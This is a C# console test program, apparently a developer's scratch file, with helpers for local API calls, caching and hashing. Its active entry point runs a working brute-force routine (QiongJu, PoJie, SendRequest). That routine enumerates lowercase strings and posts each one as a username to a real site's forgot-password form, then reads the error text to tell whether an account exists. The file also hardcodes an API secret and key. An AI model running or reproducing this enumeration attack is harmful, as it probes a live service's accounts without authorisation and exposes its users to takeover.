using LunWen.Cache;
using LunWen.Infrastructure;
using LunWen.Model;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace ConsoleClient
{
    class Program
    {
        static void Main(string[] args)
        {
            //GetRandomStr();
            //GetSomePassword();            
            //TestNetHelperPost();
            //string content = NetHelper.Get("http://www.baidu.com");
            //TestApiInvoker();
            //PoJie();
            QiongJu();
            //GetAccessConfigData();
            //TestCache();
            Console.ReadKey();
        }

        private static void TestApiInvoker()
        {
            var response = AppNetHelper.Get<UserInfo>("http://localhost:8091/api/user/getAll?usercode=admin");
            if (response.Status == 200)
            {

            }

            var response2 = AppNetHelper.Post<User>("http://localhost:8091/api/user/Add",
                new User { UserCode = "tester", UserName = "testerName" });
            if (response2.Status == 200)
            {
                var user = response2.Data;
            }
        }

        private static void TestNetHelper()
        {
            string url = "http://localhost:8011/api/user/getAll?usercode=admin";

            HttpWebRequest request = HttpWebRequest.Create(url) as HttpWebRequest;
            request = HttpWebRequest.Create(AddSign(request)) as HttpWebRequest;

            request.Method = "GET";
            request.ContentType = "application/json";
            WebResponse response = request.GetResponse();
            var stream = response.GetResponseStream();
            using (StreamReader sr = new StreamReader(stream, Encoding.UTF8))
            {
                var content = sr.ReadToEnd();
            }
        }

        private static void TestNetHelperPost()
        {
            string url = "http://localhost:32311/api/user/getAll?usercode=admin";


            HttpWebRequest request = HttpWebRequest.Create(url) as HttpWebRequest;
            object requestBody = new User { UserCode = "user1000", UserName = "user1000" };

            List<string> para = new List<string>();
            foreach (var item in requestBody.GetType().GetProperties())
            {
                var val = item.GetValue(requestBody);
                if (string.IsNullOrEmpty(val.ToString()))
                    para.Add(val.ToString());
            }
            para.Sort();


            request.Method = "Post";
            request.ContentType = "application/json";

            string body = JsonHelper.SerializeObject(requestBody);
            byte[] bytes = Encoding.UTF8.GetBytes(body);
            request.GetRequestStream().Write(bytes, 0, bytes.Length);

            WebResponse response = request.GetResponse();
            var stream = response.GetResponseStream();
            using (StreamReader sr = new StreamReader(stream, Encoding.UTF8))
            {
                var content = sr.ReadToEnd();
            }
        }

        private static bool PoJie(string str)
        {
            if (SendRequest(str, "admin@163.com"))
            {
                Console.WriteLine(string.Format("{0},{1} - success", str, "admin@163.com"));
                return true;
            }
            else
            {
                Console.WriteLine(string.Format("{0},{1} - fail", str, "admin@163.com"));
                return false;
            }

        }

        private static string QiongJu()
        {
            string baseTest = "abcdefghljklmnopqrstuvwxyz";

            //Loop(baseTest, new char[1], 0);
            for (int i = 4; i <= baseTest.Length; i++)
            {
                if (Flag)
                    break;
                Loop(baseTest, new char[i], 0);
            }



            return "";

        }

        private static int CountNumber = 0;
        private static bool Flag = false;
        private static void Loop(string baseTest, char[] charArr, int charCurrentIndex)
        {
            for (int j = 0; j < baseTest.Length; j++)
            {
                if (Flag)
                    break;

                charArr[charCurrentIndex] = baseTest[j];
                if (charCurrentIndex + 1 == charArr.Length)
                {
                    string s = new string(charArr);
                    Console.WriteLine(s);
                    if (string.Compare(s, "aeoe") > -1)
                    {
                        CountNumber++;
                        System.Threading.Thread.Sleep(new TimeSpan(0, 0, 3));
                        if (PoJie(s))
                            Flag = true;
                    }
                }
                else
                {
                    Loop(baseTest, charArr, charCurrentIndex + 1);
                }
            }
        }

        private static bool SendRequest(string userName, string email)
        {
            string url = "https://www.sojump.hk/wjx/user/forgetpassword.aspx";
            HttpWebRequest request = HttpWebRequest.Create(url) as HttpWebRequest;

            email = HttpUtility.UrlEncode(email);

            request.Method = "Post";
            request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
            string body = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEzNTQ0MTk3MTlkZHV2lLgYESMUrnglPm18EFZQ5Kv%2B&__EVENTVALIDATION=%2FwEdAATGkB4Yf3xe7KIXHQEVxh2YR1LBKX1P1xh290RQyTesRUMHZh9ZuPBRie2vA%2FHfoRIP%2FjKiv%2FYmGeAMMRSo4HL3MLrwCuxhcRuNaKl0ZTARIHX7TSw%3D&UserName=" + userName + "&txtEmail=" + email + "&SubmitButton=%E4%B8%8B%E4%B8%80%E6%AD%A5";

            byte[] bytes = Encoding.UTF8.GetBytes(body);
            request.GetRequestStream().Write(bytes, 0, bytes.Length);

            WebResponse response = request.GetResponse();
            var stream = response.GetResponseStream();
            using (StreamReader sr = new StreamReader(stream, Encoding.UTF8))
            {
                var content = sr.ReadToEnd();
                if (content.Contains("用户名不存在，请重新输入！"))
                    return false;
                else
                    return true;
            }
        }

        public class User
        {
            public string UserCode { get; set; }
            public string UserName { get; set; }
        }


        private static string AddSign(HttpWebRequest request)
        {
            List<string> para = new List<string>();
            string query = request.Address.Query;
            foreach (var item in query.Split(new char[] { '&' }, StringSplitOptions.RemoveEmptyEntries))
            {
                var keyvalue = item.Split(new char[] { '=' }, StringSplitOptions.RemoveEmptyEntries);
                if (keyvalue.Count() >= 2)
                    para.Add(keyvalue[1]);
            }
            para.Sort();

            string appSecret = "s+QG+0CIX0G0T22pw+I+jw";
            string appKey = "44j2scyyl4rdrtaj4cdm0f";
            string sign = HashHelper.HashMd5(string.Join(",", para), appSecret);

            if (request.RequestUri.AbsoluteUri.Contains("?"))
                return request.RequestUri.AbsoluteUri + "&appkey=" + appKey +
                    "&sign=" + sign;
            else
                return request.RequestUri.AbsoluteUri + "?appkey=" + appKey +
                    "&sign=" + sign;
        }

        private static void GetSomePassword()
        {
            StringBuilder builder = new StringBuilder();

            List<string> pwds = new List<string>()
           {
               "123","123456"
           };

            foreach (var pwd in pwds)
            {
                var salt = Guid.NewGuid().ToString();
                var hashPwd = HashHelper.HashMd5(pwd, salt);
                builder.AppendFormat("{0}  {1}  {2} \r\n", pwd, salt, hashPwd);
            }

            System.IO.File.WriteAllText("d:/pwd.txt", builder.ToString());
            Process.Start("d:/pwd.txt");
        }

        private static string GetRandomStr()
        {
            return Convert.ToBase64String(Guid.NewGuid().ToByteArray()).Replace("=", "");
        }

        private static void TestCache()
        {
            UserInfo user = new UserInfo();
            user.Id = 1;
            user.UserCode = "admin";
            user.UserName = "admin";

            ICache cache = new ReidsCache();
            cache.Store("user", user);

            var userInCache = cache.Get<User>("user");

            cache.Store("users", new List<UserInfo> { new UserInfo { UserCode = "admin" }, new UserInfo { UserCode = "user" } });
            var usersInCache = cache.Get<IEnumerable<User>>("users");

        }

        private static void GetAccessConfigData()
        {
            for (int i = 0; i < 1; i++)
            {
                Console.WriteLine((System.IO.Path.GetRandomFileName() + System.IO.Path.GetRandomFileName()).Replace(".", ""));
                Console.WriteLine(GetRandomStr());
            }
        }
    }
}
